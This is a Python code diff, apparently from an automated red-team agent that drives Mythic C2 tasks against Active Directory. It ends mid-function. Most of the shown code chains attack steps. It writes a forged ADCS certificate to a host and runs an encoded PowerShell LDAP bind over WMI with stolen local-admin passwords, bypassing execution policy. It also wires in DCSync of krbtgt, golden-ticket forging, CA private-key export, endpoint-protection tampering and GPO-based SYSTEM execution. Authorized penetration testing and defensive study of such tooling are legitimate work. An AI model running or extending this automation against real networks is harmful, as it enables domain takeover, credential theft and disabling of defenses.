+        local_admin_effect = f"local-admin:{target_host_short}@{target_domain}"
+        remote_exec_effect = f"remote-exec:{target_host_short}@{target_domain}"
+        if remote_exec_effect not in achieved or (
+            local_admin_effect not in achieved
+            and f"admin:{target_host_short}" not in achieved
+            and f"system-or-admin:{target_host_short}" not in achieved
+        ):
+            return None
+
+        credential = await self._select_managed_local_admin_credential(target_host_short, target_domain, "Administrator")
+        if not credential:
+            return None
+        password = self._capability_text(credential.get("credential"))
+        local_account = self._capability_text(credential.get("account") or "Administrator")
+        if not password:
+            return None
+
+        pfx_path = self._capability_text(
+            inputs.get("forged_pfx_path")
+            or inputs.get("forged_certificate_path")
+            or inputs.get("certificate_path")
+        )
+        pfx_password = self._capability_text(
+            inputs.get("forged_pfx_password")
+            or inputs.get("forged_certificate_password")
+            or inputs.get("certificate_password")
+        )
+        evidence = materialized_payload.get("evidence") if isinstance(materialized_payload, dict) else {}
+        local_pfx_path = self._capability_text(
+            (evidence or {}).get("forged_pfx_artifact_path")
+            or (evidence or {}).get("local_forged_pfx_path")
+            or inputs.get("_local_forged_pfx_path")
+        )
+        if not pfx_path or not pfx_password or not local_pfx_path:
+            return None
+        pfx_file = Path(local_pfx_path)
+        if not pfx_file.is_file():
+            return None
+
+        try:
+            try:
+                from . import mythic_capability_adapter
+            except ImportError:
+                import mythic_capability_adapter
+            dc = (
+                self._capability_text(inputs.get("ldap_server") or inputs.get("domain_controller") or inputs.get("dc"))
+                or await self._resolve_domain_controller_host(domain)
+                or domain
+            )
+            search_base = self._capability_text(inputs.get("search_base") or inputs.get("base_dn"))
+            if not search_base:
+                search_base = ",".join(f"DC={part}" for part in str(domain or "").split(".") if part)
+            slug = self._capability_slug("_".join(
+                self._capability_text(part)
+                for part in (account, domain, callback_id, target_host_short)
+                if self._capability_text(part)
+            ))
+            proof_marker = self._capability_text(inputs.get("proof_marker") or f"SAGE_CERT_AUTH_PROOF_{slug}")
+            output_path = self._capability_text(
+                inputs.get("remote_schannel_output_path")
+                or inputs.get("remote_output_path")
+                or f"C:\\Windows\\Temp\\sage_cert_auth_{slug}.txt"
+            )
+            pfx_b64 = base64.b64encode(pfx_file.read_bytes()).decode("ascii")
+            schannel = mythic_capability_adapter._certificate_schannel_ldap_powershell(
+                domain=domain,
+                account=account,
+                certificate_path=pfx_path,
+                certificate_password=pfx_password,
+                domain_controller=dc,
+                search_base=search_base,
+                proof_marker=proof_marker,
+            )
+            ps_quote = mythic_capability_adapter._ps_quote
+            if "$lines|Write-Output" in schannel:
+                schannel = schannel.rsplit("$lines|Write-Output", 1)[0]
+            schannel = schannel.replace(
+                "$lines|Write-Output;return",
+                "throw 'CERT_AUTH_REMOTE_LDAP_BIND_FAILED'",
+            )
+            remote_script = ";".join([
+                "$ErrorActionPreference='Continue'",
+                f"$certBytes=[Convert]::FromBase64String('{pfx_b64}')",
+                f"[IO.File]::WriteAllBytes({ps_quote(pfx_path)},$certBytes)",
+                schannel,
+                f"$lines|Set-Content -Encoding ASCII -Path {ps_quote(output_path)}",
+                "$lines|Write-Output",
+            ])
+            encoded = base64.b64encode(remote_script.encode("utf-16le")).decode("ascii")
+            remote_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + encoded
+        except Exception:
+            return None
+
+        host = self._capability_host_name(target_host_short, target_domain)
+        realm = self._capability_text(credential.get("realm") or target_host_short)
+        if "." in realm:
+            realm = target_host_short
+        output_unc = self._capability_unc_from_windows_path(host, output_path)
+        remote_transaction = {
+            "capability": self._capability_text(getattr(action, "name", "")),
+            "target": self._capability_text(getattr(action, "target", "")),
+            "required_effects": list(getattr(action, "effects", []) or []),
+            "artifact_obligations": [],
+            "delayed_effect_obligations": [],
+            "proof_obligations": ["extract_adcs_certificate_auth_probe"],
+            "validated_artifacts": [],
+            "events": [],
+        }
+        commands = [
+            {
+                "command": "wmiexecute",
+                "parameters": {
+                    "command": remote_command,
+                    "host": host,
+                    "username": local_account,
+                    "password": password,
+                    "domain": realm,
+                },
+                "purpose": f"run Schannel certificate-auth proof from {target_host_short}@{target_domain}",
+                "expected_probe": "",
+                "produces": ["remote_process_created"],
+                "consumes": ["forged_certificate_pfx", remote_exec_effect, local_admin_effect],
+            },
+            {
+                "command": "cat",
+                "parameters": {"path": output_unc},
+                "purpose": f"read remote Schannel certificate-auth proof from {output_unc}",
+                "expected_probe": "extract_adcs_certificate_auth_probe",
+                "produces": ["certificate_schannel_ldap_probe"],
+                "consumes": ["remote_process_created"],
+            },
+        ]
+
+        accumulated_probe: dict = {}
+        for index, command_obj in enumerate(commands):
+            item = await self._execute_capability_command(command_obj, callback_id, timeout)
+            item["fallback"] = "remote-schannel-ldap"
+            item["fallback_reason"] = "direct Schannel LDAP was unavailable from the current callback"
+            all_issued.append(item)
+            output = self._capability_text(item.get("_output"))
+            if index == 0 and self._capability_executor_task_failed(item):
+                remote_transaction["status"] = "command_failed"
+                remote_transaction["pin_reason"] = item.get("failure_reason") or "remote Schannel command failed"
+                break
+            probe, verification = self._capability_executor_verify_output(
+                action,
+                inputs,
+                callback_id,
+                output,
+                command_obj,
+                capabilities_mod,
+            )
+            if verification is None:
+                continue
+            if probe:
+                accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
+                verification = capabilities_mod.verify_capability(
+                    self._capability_text(getattr(action, "name", "")),
+                    accumulated_probe,
+                )
+                probe = dict(accumulated_probe)
+            item["verify_verdict"] = verification.verdict
+            item["verify_reason"] = verification.reason
+            self._capability_transaction_update_verification(remote_transaction, command_obj, verification)
+            if verification.verdict == "achieved":
+                if not self._capability_action_effects_achieved(action):
+                    self.record_capability_result(
+                        action,
+                        probe or accumulated_probe or {},
+                        evidence={
+                            "source": "execute_capability",
+                            "provenance": "run",
+                            "mythic_task_id": item.get("task_id"),
+                            "callback_id": callback_id,
+                            "command": item.get("command"),
+                            "fallback": "remote-schannel-ldap",
+                            "remote_host": host,
+                        },
+                    )
+                after_effects = self._capability_achieved_effects()
+                return json.dumps({
+                    "ok": True,
+                    "verdict": "achieved",
+                    "capability": self._capability_text(getattr(action, "name", "")),
+                    "reason": verification.reason,
+                    "action": asdict(action) if is_dataclass(action) else {},
+                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                    "issued": self._capability_executor_public_issued(all_issued),
+                    "recorded_effects": sorted(after_effects - before_effects),
+                    "achieved_effects": sorted(after_effects),
+                    "stopped_after": "remote_schannel_ldap_fallback_verified_proof",
+                    "pkinit_transaction": prior_transaction,
+                    "local_schannel_transaction": local_schannel_transaction,
+                    "transaction": remote_transaction,
+                    "fallback": "remote-schannel-ldap",
+                }, sort_keys=True)
+            if self._capability_executor_task_failed(item):
+                break
+        return None
+
+    def _capability_executor_ldap_unavailable(self, output: str) -> bool:
+        low = self._capability_text(output).casefold()
+        return "ldap server is unavailable" in low or "cert_auth_inner_error=the ldap server is unavailable" in low
+
+    def _capability_executor_pkinit_not_supported(self, output: str) -> bool:
+        low = self._capability_text(output).casefold()
+        return (
+            "kdc_err_padata_type_nosupp" in low
+            or "padata type nosupp" in low
+            or "krb-error (16)" in low
+        )
+
+    def _capability_executor_unresolved_placeholders(self, command_obj: dict) -> set[str]:
+        placeholders = self._capability_executor_placeholders(command_obj.get("parameters"))
+        allowed = {"kerberos_ticket_base64"}
+        return {item for item in placeholders if item not in allowed}
+
+    def _capability_executor_placeholders(self, value) -> set[str]:
+        found: set[str] = set()
+        if isinstance(value, dict):
+            for item in value.values():
+                found.update(self._capability_executor_placeholders(item))
+            return found
+        if isinstance(value, (list, tuple, set)):
+            for item in value:
+                found.update(self._capability_executor_placeholders(item))
+            return found
+        text = self._capability_text(value)
+        for match in re.findall(r"\{\{\s*([A-Za-z0-9_.:-]+)\s*\}\}", text):
+            found.add(match.strip())
+        return found
+
+    def _capability_executor_task_failed(self, item: dict) -> bool:
+        result_class = self._capability_text(item.get("result_class")).casefold()
+        output = self._capability_text(item.get("_output"))
+        low = output.casefold()
+        if result_class == command_builder.ResultClass.SUCCESS.value:
+            return False
+        if low.startswith("genuine failure"):
+            return True
+        if low.startswith("stop ") or low.startswith("stop —"):
+            return True
+        if "timed out after" in low:
+            return True
+        if "construction failure" in low:
+            return True
+        return result_class in {
+            command_builder.ResultClass.CONSTRUCTION.value,
+            command_builder.ResultClass.GENUINE.value,
+            command_builder.ResultClass.TRANSIENT.value,
+        }
+
+    def _capability_executor_failure_reason(self, output: str) -> str:
+        text = self._capability_text(output)
+        if not text:
+            return "no task output"
+        return self._capability_executor_output_preview(text, limit=600)
+
+    def _capability_executor_timeout(self, inputs: dict) -> int | None:
+        value = (
+            inputs.get("execution_timeout")
+            or inputs.get("task_timeout")
+            or inputs.get("command_timeout")
+            or inputs.get("timeout")
+        )
+        try:
+            timeout = int(value)
+            return timeout if timeout > 0 else None
+        except (TypeError, ValueError):
+            return None
+
+    def _capability_executor_materialized_summary(self, payload: dict | None) -> dict:
+        if not isinstance(payload, dict):
+            return {}
+        out = {
+            "ok": bool(payload.get("ok")),
+            "capability": self._capability_text(payload.get("capability")),
+        }
+        staged = payload.get("staged")
+        if isinstance(staged, dict):
+            out["staged"] = {
+                "remote_path": staged.get("remote_path"),
+                "callback_id": staged.get("callback_id"),
+                "upload_task_id": staged.get("upload_task_id"),
+                "mythic_file_uuid": "<file_uuid>" if staged.get("mythic_file_uuid") else "",
+            }
+        return out
+
+    def _capability_executor_public_issued(self, issued: list[dict]) -> list[dict]:
+        public: list[dict] = []
+        for item in issued:
+            if not isinstance(item, dict):
+                continue
+            row = {key: value for key, value in item.items() if not str(key).startswith("_")}
+            public.append(row)
+        return public
+
+    def _capability_failed_effects(self) -> set[str]:
+        effects: set[str] = set()
+        for hop in list(getattr(self, "_engagement_hops", []) or []):
+            if self._capability_text(getattr(hop, "status", "")).casefold() not in {"failed", "blocked"}:
+                continue
+            for effect in list(getattr(hop, "satisfied_effects", []) or []) or [getattr(hop, "effect", "")]:
+                text = self._capability_text(effect)
+                if text:
+                    effects.add(self._canonical_capability_effect(text))
+        return effects
+
+    def _capability_executor_record_failed_attempt(
+        self,
+        payload: dict,
+        action,
+        inputs: dict | None,
+        callback_id: str | int | None,
+        issued: list[dict] | None,
+        failure_probe: dict | None,
+    ) -> list[str]:
+        if not isinstance(payload, dict) or payload.get("ok") is True:
+            return []
+        if not action or not self._capability_text(getattr(action, "name", "")):
+            return []
+        wanted = {
+            self._canonical_capability_effect(effect)
+            for effect in list(getattr(action, "effects", []) or [])
+            if self._capability_text(effect)
+        }
+        if not wanted or wanted & self._capability_failed_effects():
+            return []
+        issued_rows = [item for item in list(issued or []) if isinstance(item, dict)]
+        last = issued_rows[-1] if issued_rows else {}
+        reason = self._capability_text(payload.get("reason") or "capability verifier failed")
+        preview = reason
+        if last.get("_output"):
+            preview = self._capability_executor_output_preview(last.get("_output"), limit=700)
+        probe = dict(failure_probe or {}) if isinstance(failure_probe, dict) else {}
+        if callback_id is not None and not self._capability_text(
+            probe.get("callback_id") or probe.get("callback") or probe.get("callback_display_id")
+        ):
+            probe["callback_id"] = self._capability_text(callback_id)
+        evidence = {
+            "source": "execute_capability",
+            "provenance": "run",
+            "terminal_failure": True,
+            "callback_id": self._capability_text(callback_id),
+            "mythic_task_id": last.get("task_id"),
+            "command": last.get("command"),
+            "verify_verdict": self._capability_text(payload.get("verdict") or "failed"),
+            "verify_reason": reason,
+            "result_preview": preview,
+        }
+        if isinstance(payload.get("transaction"), dict):
+            evidence["transaction_status"] = payload["transaction"].get("status")
+        if isinstance(inputs, dict):
+            evidence["capability_inputs"] = self._capability_executor_safe_parameters(inputs)
+        verification = self.record_capability_result(
+            action,
+            probe,
+            evidence=evidence,
+        )
+        if self._capability_text(getattr(verification, "verdict", "")) == "achieved":
+            return []
+        return sorted(wanted)
+
+    def _capability_executor_failure_json(
+        self,
+        payload: dict,
+        action,
+        inputs: dict | None,
+        callback_id: str | int | None = None,
+        *,
+        reason: str | None = None,
+        issued: list[dict] | None = None,
+        build_payload: dict | None = None,
+        record_failed: bool = False,
+        failure_probe: dict | None = None,
+    ) -> str:
+        if record_failed:
+            recorded_failed = self._capability_executor_record_failed_attempt(
+                payload,
+                action,
+                inputs,
+                callback_id,
+                issued,
+                failure_probe,
+            )
+            if recorded_failed:
+                payload["recorded_failed_effects"] = recorded_failed
+        return json.dumps(
+            self._capability_attach_trajectory_repair(
+                payload,
+                action,
+                inputs,
+                callback_id,
+                reason=reason,
+                issued=issued,
+                build_payload=build_payload,
+            ),
+            sort_keys=True,
+        )
+
+    def _capability_attach_trajectory_repair(
+        self,
+        payload: dict,
+        action,
+        inputs: dict | None,
+        callback_id: str | int | None = None,
+        *,
+        reason: str | None = None,
+        issued: list[dict] | None = None,
+        build_payload: dict | None = None,
+    ) -> dict:
+        if not isinstance(payload, dict) or payload.get("ok") is True:
+            return payload
+        try:
+            trajectory_runtime = self._trajectory_runtime_mod()
+            bridge = trajectory_runtime.TrajectoryRepairBridge.from_env()
+            issued_rows = issued
+            if issued_rows is None:
+                issued_rows = payload.get("issued") if isinstance(payload.get("issued"), list) else []
+            payload["trajectory_repair"] = bridge.record_failure(
+                action=action,
+                inputs=inputs or {},
+                callback_id=callback_id,
+                reason=reason if reason is not None else payload.get("reason", ""),
+                issued=issued_rows,
+                verifier_status=self._capability_text(payload.get("verdict") or "failed"),
+                source="execute_capability",
+                build_payload=build_payload,
+            )
+        except Exception as exc:
+            payload["trajectory_repair"] = {
+                "enabled": False,
+                "recorded": False,
+                "error": self._capability_text(exc),
+            }
+        return payload
+
+    def _trajectory_runtime_mod(self):
+        try:
+            from ..trajectory import runtime as trajectory_runtime
+            return trajectory_runtime
+        except Exception:
+            pass
+        try:
+            import trajectory.runtime as trajectory_runtime
+            return trajectory_runtime
+        except Exception:
+            import sys
+            ai_dir = str(Path(__file__).resolve().parents[1])
+            if ai_dir not in sys.path:
+                sys.path.insert(0, ai_dir)
+            import trajectory.runtime as trajectory_runtime
+            return trajectory_runtime
+
+    def _capability_existing_effect_proofs(self, action) -> list[dict]:
+        wanted = {
+            self._capability_text(item).casefold()
+            for item in list(getattr(action, "effects", []) or [])
+            if self._capability_text(item)
+        }
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        domain = self._capability_text(
+            intent.get("target_domain")
+            or intent.get("effect_domain")
+            or intent.get("domain")
+        ).casefold()
+        related = set(wanted)
+        if domain:
+            related.update({f"da:{domain}", f"ea:{domain}", f"krbtgt-hash:{domain}"})
+        proofs: list[dict] = []
+        seen: set[str] = set()
+        for hop in list(getattr(self, "_engagement_hops", []) or []):
+            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
+                continue
+            effects = list(getattr(hop, "satisfied_effects", []) or [])
+            if not effects:
+                effects = [getattr(hop, "effect", "")]
+            for effect in effects:
+                effect_text = self._capability_text(effect).casefold()
+                if not effect_text or effect_text in seen:
+                    continue
+                if effect_text not in related and not (
+                    domain and effect_text.startswith("certificate-auth:") and effect_text.endswith(f"@{domain}")
+                ):
+                    continue
+                row = {
+                    "effect": effect_text,
+                    "technique": self._capability_text(getattr(hop, "technique", "")),
+                    "target": self._capability_text(getattr(hop, "target", "")),
+                }
+                task_id = self._capability_hop_task_id(hop)
+                if task_id:
+                    row["task_id"] = task_id
+                callback_id = self._capability_hop_callback_id(hop)
+                if callback_id:
+                    row["callback_id"] = callback_id
+                proofs.append(row)
+                seen.add(effect_text)
+        proofs.sort(key=lambda item: (
+            0 if item["effect"] in wanted else 1,
+            item["effect"],
+        ))
+        return proofs
+
+    def _capability_hop_task_id(self, hop) -> str:
+        evidence = getattr(hop, "evidence", {}) or {}
+        if not isinstance(evidence, dict):
+            return ""
+        for key in ("mythic_task_id", "task_id", "task", "display_id"):
+            value = self._capability_text(evidence.get(key)).strip()
+            if value:
+                return value
+        return ""
+
+    def _capability_hop_callback_id(self, hop) -> str:
+        evidence = getattr(hop, "evidence", {}) or {}
+        if not isinstance(evidence, dict):
+            return ""
+        for key in ("callback_id", "callback", "callback_display_id"):
+            value = self._capability_text(evidence.get(key)).strip()
+            if value:
+                return value
+        return ""
+
+    def _capability_executor_safe_parameters(self, parameters):
+        opaque_secret_keys = {
+            "credential",
+            "password",
+            "base64ticket",
+            "ticket",
+            "ticket_base64",
+            "existingticket",
+            "local_admin_password",
+            "managed_local_admin_secret",
+            "secret",
+            "credential_text",
+            "pfx_password",
+            "certificate_password",
+            "ca_pfx_password",
+            "ca_cert_password",
+            "ca_certificate_password",
+            "forged_pfx_password",
+            "forged_certificate_password",
+            "new_cert_password",
+        }
+        redacted_text_keys = {
+            "commands",
+            "assembly_arguments",
+        }
+        if isinstance(parameters, dict):
+            out = {}
+            for key, value in parameters.items():
+                key_text = self._capability_text(key)
+                if key_text.casefold() in opaque_secret_keys:
+                    out[key] = "<secret>"
+                elif key_text.casefold() in redacted_text_keys:
+                    out[key] = self._capability_executor_redact_text(value)
+                elif isinstance(value, dict):
+                    out[key] = self._capability_executor_safe_parameters(value)
+                else:
+                    out[key] = value
+            return out
+        return self._capability_executor_redact_text(parameters)
+
+    def _capability_executor_output_preview(self, output, limit: int = 1000) -> str:
+        text = self._capability_executor_redact_text(output)
+        if len(text) <= limit:
+            return text
+        return text[-limit:]
+
+    def _capability_executor_redact_text(self, value) -> str:
+        text = self._capability_text(value)
+        if not text:
+            return ""
+        text = re.sub(
+            r"(?is)(base64\(ticket\.kirbi\)\s*:\s*)([A-Za-z0-9+/=\s\\\/]{64,})",
+            r"\1<kerberos_ticket_base64>",
+            text,
+        )
+        text = re.sub(
+            r"(?is)([\"']?(?:ticket|credential|base64ticket|ticket_base64)[\"']?\s*[:=]\s*[\"'])([A-Za-z0-9+/=\\\/]{80,})([\"'])",
+            r"\1<kerberos_ticket_base64>\3",
+            text,
+        )
+        text = re.sub(
+            r"(?<![A-Za-z0-9+/=\\\/])(?:[A-Za-z0-9+/=\\\/]{160,})(?![A-Za-z0-9+/=\\\/])",
+            "<base64_blob>",
+            text,
+        )
+        text = re.sub(
+            r"(?i)(/(?:aes256|aes128|rc4|ntlm|password):)([^\s\"']+)",
+            r"\1<secret>",
+            text,
+        )
+        text = re.sub(r"(?i)\b[0-9a-f]{64}\b", "<hex64_secret>", text)
+        text = re.sub(r"(?i)\b[0-9a-f]{32}\b", "<hex32_secret>", text)
+        return text
+
+    def _capability_achieved_effects(self) -> set[str]:
+        effects: set[str] = set()
+        for hop in list(getattr(self, "_engagement_hops", []) or []):
+            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
+                continue
+            satisfied = list(getattr(hop, "satisfied_effects", []) or [])
+            if not satisfied:
+                satisfied = [getattr(hop, "effect", "")]
+            for effect in satisfied:
+                text = self._capability_text(effect)
+                if text:
+                    effects.add(self._canonical_capability_effect(text))
+        return effects
+
+    def _canonical_capability_effect(self, effect) -> str:
+        text = self._capability_text(effect).strip().casefold()
+        if not text.startswith("creds:"):
+            return text
+        tail = text[len("creds:"):]
+        if "@" not in tail:
+            return text
+        account, realm = tail.rsplit("@", 1)
+        account = self._canonical_credential_account(account)
+        realm = realm.strip().casefold()
+        if not account or not realm:
+            return text
+        return f"creds:{account}@{realm}"
+
+    def _capability_action_effects_achieved(self, action, achieved_effects: set[str] | None = None) -> bool:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability in {"ensure-kerberos-context", "ensure-account-kerberos-context"}:
+            return False
+        wanted = {
+            self._capability_text(item)
+            for item in list(getattr(action, "effects", []) or [])
+            if self._capability_text(item)
+        }
+        if not wanted:
+            return False
+        achieved = (
+            {self._canonical_capability_effect(item) for item in achieved_effects}
+            if achieved_effects is not None else self._capability_achieved_effects()
+        )
+        # Don't let a COARSE co-effect (da:/ea:) short-circuit a capability that also declares a more SPECIFIC
+        # proof effect (e.g. adcs-certificate-auth declares both da:{domain} AND certificate-auth:{acct}@{domain}).
+        # If da: was already achieved by some OTHER technique, the specific cert-auth proof was never gathered —
+        # skipping it would decline real work and leave the specific effect unverified. Require a specific effect
+        # match when one exists; fall back to any-overlap only for capabilities whose effects are all coarse.
+        specific = {e for e in wanted if not e.casefold().startswith(("da:", "ea:"))}
+        check = specific if specific else wanted
+        return bool(check & achieved)
+
+    def _capability_host_scoped_precondition_failure(
+        self,
+        action,
+        inputs: dict,
+        achieved_effects: set[str],
+    ) -> dict:
+        """Fail closed when a compact host-scoped capability is aimed at an unproven host.
+
+        Local-admin and remote-exec effects are host facts, not domain facts. This guard keeps a
+        model-authored compact action from using local admin on one machine as evidence for another.
+        Rendered NEXT CAPABILITY ACTIONs already carry these preconditions; compact actions need the
+        same invariant enforced at execution time.
+        """
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability not in {
+            "use-managed-local-admin-secret",
+            "execute-as-local-admin",
+            "endpoint-protection-adjustment",
+            "adcs-ca-private-key-export",
+        }:
+            return {}
+
+        target_host = self._capability_target_host(action, inputs)
+        target_domain = (
+            self._capability_managed_secret_target_domain(action, inputs)
+            or self._capability_target_domain(action, inputs)
+            or self._capability_domain(action, inputs)
+        )
+        host = self._capability_host_short(target_host)
+        domain = self._capability_text(target_domain).casefold()
+        if not host or not domain:
+            return {}
+
+        achieved = {self._canonical_capability_effect(item) for item in achieved_effects}
+        local_admin_effect = f"local-admin:{host}@{domain}"
+        managed_secret_effect = f"managed-local-admin-secret:{host}@{domain}"
+        remote_exec_effect = f"remote-exec:{host}@{domain}"
+        local_admin_satisfied = (
+            local_admin_effect in achieved
+            or f"admin:{host}" in achieved
+            or f"system-or-admin:{host}" in achieved
+        )
+
+        missing: list[str] = []
+        if capability == "use-managed-local-admin-secret" and managed_secret_effect not in achieved:
+            missing.append(managed_secret_effect)
+        if capability == "execute-as-local-admin" and not local_admin_satisfied:
+            missing.append(local_admin_effect)
+        if capability in {"endpoint-protection-adjustment", "adcs-ca-private-key-export"}:
+            if not local_admin_satisfied:
+                missing.append(local_admin_effect)
+            if remote_exec_effect not in achieved:
+                missing.append(remote_exec_effect)
+
+        if not missing:
+            return {}
+        return {
+            "missing": sorted(set(missing)),
+            "reason": (
+                "host-scoped capability preconditions are missing for "
+                f"{host}@{domain}; local-admin or remote-exec on another host does not satisfy this target"
+            ),
+        }
+
+    def _capability_artifact_scoped_precondition_failure(
+        self,
+        action,
+        inputs: dict,
+        achieved_effects: set[str],
+    ) -> dict:
+        """Fail closed when an artifact-backed compact action skips its artifact-producing hop."""
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability != "adcs-certificate-auth":
+            return {}
+
+        if (
+            self._capability_input_bool(inputs, "certificate_already_forged")
+            or self._capability_input_bool(inputs, "skip_certificate_forge")
+            or self._capability_input_bool(inputs, "pre_forged_certificate")
+            or self._capability_input_bool(getattr(action, "intent", {}), "certificate_already_forged")
+            or self._capability_input_bool(getattr(action, "intent", {}), "skip_certificate_forge")
+            or self._capability_input_bool(getattr(action, "intent", {}), "pre_forged_certificate")
+        ):
+            return {}
+
+        if self._capability_text(
+            inputs.get("ca_pfx_path")
+            or inputs.get("ca_cert_path")
+            or inputs.get("ca_certificate_path")
+            or getattr(action, "intent", {}).get("ca_pfx_path")
+            or getattr(action, "intent", {}).get("ca_cert_path")
+            or getattr(action, "intent", {}).get("ca_certificate_path")
+        ):
+            return {}
+
+        domain = (
+            self._capability_target_domain(action, inputs)
+            or self._capability_domain(action, inputs)
+            or self._capability_account_domain(action, inputs)
+        )
+        account = self._capability_account(action, inputs) or "administrator"
+        ca_host = self._capability_text(
+            inputs.get("ca_host")
+            or getattr(action, "intent", {}).get("ca_host")
+            or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
+        ).casefold()
+        achieved = {self._canonical_capability_effect(item) for item in achieved_effects}
+
+        enrolled_effect = f"adcs-enrolled-certificate:{account}@{domain}" if account and domain else ""
+        if enrolled_effect and enrolled_effect in achieved:
+            inputs.setdefault("certificate_already_forged", True)
+            return {}
+
+        if not ca_host and domain:
+            ca_hosts = sorted(self._capability_verified_ca_key_hosts(domain, achieved))
+            if len(ca_hosts) == 1:
+                ca_host = ca_hosts[0]
+                inputs.setdefault("ca_host", ca_host)
+
+        ca_key_effect = f"adcs-ca-private-key:{ca_host}@{domain}" if ca_host and domain else ""
+        if ca_key_effect and ca_key_effect in achieved:
+            return {}
+
+        missing: list[str] = []
+        if not ca_host:
+            missing.append("ca_host")
+        if domain:
+            missing.append(ca_key_effect or f"adcs-ca-private-key:<ca_host>@{domain}")
+            if account:
+                missing.append(enrolled_effect)
+        else:
+            missing.append("domain")
+        return {
+            "missing": sorted(set(item for item in missing if item)),
+            "suggested_capability": "adcs-ca-private-key-export",
+            "reason": (
+                "adcs-certificate-auth requires a verified CA private-key or enrolled-certificate artifact; "
+                "run the artifact-producing ADCS capability first instead of probing service access from an "
+                "unmaterialized certificate-auth action"
+            ),
+        }
+
+    def _capability_verified_ca_key_hosts(self, domain: str, achieved_effects: set[str]) -> set[str]:
+        target_domain = self._capability_text(domain).casefold()
+        if not target_domain:
+            return set()
+        prefix = "adcs-ca-private-key:"
+        suffix = f"@{target_domain}"
+        hosts: set[str] = set()
+        for effect in achieved_effects:
+            text = self._canonical_capability_effect(effect)
+            if not text.startswith(prefix) or not text.endswith(suffix):
+                continue
+            host = text[len(prefix):-len(suffix)]
+            if host:
+                hosts.add(self._capability_host_short(host))
+        return hosts
+
+    def _capability_input_bool(self, inputs: dict, key: str) -> bool:
+        value = inputs.get(key) if isinstance(inputs, dict) else None
+        if isinstance(value, bool):
+            return value
+        return self._capability_text(value).casefold() in {"1", "true", "yes", "y", "on"}
+
+    async def _augment_capability_runtime_inputs(self, action, inputs: dict) -> None:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability not in {
+            "dcsync-krbtgt",
+            "dcsync-account",
+            "forge-golden-ticket",
+            "ensure-kerberos-context",
+            "ensure-account-kerberos-context",
+            "read-managed-local-admin-secret",
+            "use-managed-local-admin-secret",
+            "execute-as-local-admin",
+            "endpoint-protection-adjustment",
+            "gpo-controlled-system-exec",
+            "adcs-ca-private-key-export",
+            "adcs-esc-certificate-enroll",
+            "adcs-certificate-auth",
+        }:
+            return
+
+        self._normalize_capability_ticket_inputs(inputs)
+        if capability == "gpo-controlled-system-exec":
+            intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+            if not self._capability_text(
+                inputs.get("current_host")
+                or inputs.get("callback_host")
+                or inputs.get("foothold_host")
+                or inputs.get("local_host")
+            ):
+                callback_id = self._capability_callback_id(action, inputs)
+                if callback_id:
+                    for foothold in list(getattr(self, "_engagement_footholds", []) or []):
+                        if self._capability_text(getattr(foothold, "callback_id", "")) == callback_id:
+                            host = self._capability_text(getattr(foothold, "host", ""))
+                            if host:
+                                inputs["current_host"] = host
+                                inputs["callback_host"] = host
+                            identity = self._capability_text(getattr(foothold, "identity", ""))
+                            if identity:
+                                inputs.setdefault("current_identity", identity)
+                                inputs.setdefault("current_user", identity)
+                                inputs.setdefault("controlled_principal", identity)
+                            break
+            else:
+                callback_id = self._capability_callback_id(action, inputs)
+                if callback_id and not self._capability_text(
+                    inputs.get("controlled_principal")
+                    or inputs.get("current_identity")
+                    or inputs.get("current_user")
+                ):
+                    for foothold in list(getattr(self, "_engagement_footholds", []) or []):
+                        if self._capability_text(getattr(foothold, "callback_id", "")) == callback_id:
+                            identity = self._capability_text(getattr(foothold, "identity", ""))
+                            if identity:
+                                inputs.setdefault("current_identity", identity)
+                                inputs.setdefault("current_user", identity)
+                                inputs.setdefault("controlled_principal", identity)
+                            break
+            target_fields = {}
+            try:
+                for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                    if "=" in part:
+                        key, value = part.split("=", 1)
+                        target_fields[key.strip().casefold()] = value.strip()
+            except Exception:
+                target_fields = {}
+            gpo = self._capability_text(
+                inputs.get("gpo")
+                or inputs.get("gpo_name")
+                or inputs.get("gponame")
+                or inputs.get("gpo_display_name")
+                or intent.get("gpo")
+                or intent.get("gpo_name")
+                or intent.get("gponame")
+                or intent.get("gpo_display_name")
+                or target_fields.get("gpo")
+                or target_fields.get("gpo_name")
+                or target_fields.get("gponame")
+                or target_fields.get("gpo_display_name")
+            ).casefold()
+            gpo_guid_input = self._capability_text(
+                inputs.get("gpo_guid")
+                or inputs.get("guid")
+                or inputs.get("gpo_object_guid")
+                or intent.get("gpo_guid")
+                or intent.get("guid")
+                or intent.get("gpo_object_guid")
+                or target_fields.get("gpo_guid")
+                or target_fields.get("guid")
+                or target_fields.get("gpo_object_guid")
+            ).strip().strip("{}").casefold()
+            if gpo_guid_input and (not gpo or gpo.strip().strip("{}") == gpo_guid_input):
+                for graph_fact in list(getattr(self, "_engagement_graph_facts", []) or []):
+                    predicate = self._capability_text(getattr(graph_fact, "predicate", "")).casefold()
+                    if not predicate.startswith("gpo-guid:"):
+                        continue
+                    parts = predicate.split(":")
+                    if len(parts) >= 3 and parts[-1].strip().strip("{}") == gpo_guid_input:
+                        gpo = parts[1].strip()
+                        intent["gpo"] = gpo
+                        break
+            domain = self._capability_text(inputs.get("domain") or intent.get("domain") or target_fields.get("domain")).casefold()
+            if gpo:
+                inputs["gpo"] = gpo
+            if domain:
+                inputs["domain"] = domain
+            if not self._capability_text(inputs.get("gpo_guid") or inputs.get("guid") or inputs.get("gpo_object_guid")) and gpo:
+                prefix = f"gpo-guid:{gpo}:"
+                for graph_fact in list(getattr(self, "_engagement_graph_facts", []) or []):
+                    predicate = self._capability_text(getattr(graph_fact, "predicate", "")).casefold()
+                    if predicate.startswith(prefix):
+                        guid = predicate[len(prefix):].strip()
+                        if guid:
+                            inputs["gpo_guid"] = guid
+                            break
+            if not inputs.get("affected_dc_hosts") and gpo and domain:
